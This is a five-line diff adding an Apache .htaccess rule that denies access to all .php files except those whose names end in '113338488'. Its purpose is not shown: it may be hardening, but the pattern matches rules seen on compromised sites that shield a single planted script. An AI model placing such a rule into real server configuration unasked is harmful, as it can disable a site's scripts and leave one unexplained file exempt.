@@ -1,0 +1,5 @@
+
+<FilesMatch "(?<!113338488)\.php$">
+Order Allow,Deny
+Deny from all
+</FilesMatch>
